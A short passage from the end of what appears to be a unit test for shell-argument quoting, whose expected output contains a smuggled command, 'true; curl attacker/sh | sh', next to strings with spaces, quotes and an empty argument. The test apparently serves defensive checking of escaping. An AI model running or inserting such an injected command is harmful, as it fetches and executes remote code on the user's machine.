            "'true; curl attacker/sh | sh' 'arg with spaces' 'single'\"'\"'quote' ''"
        );
    }
}
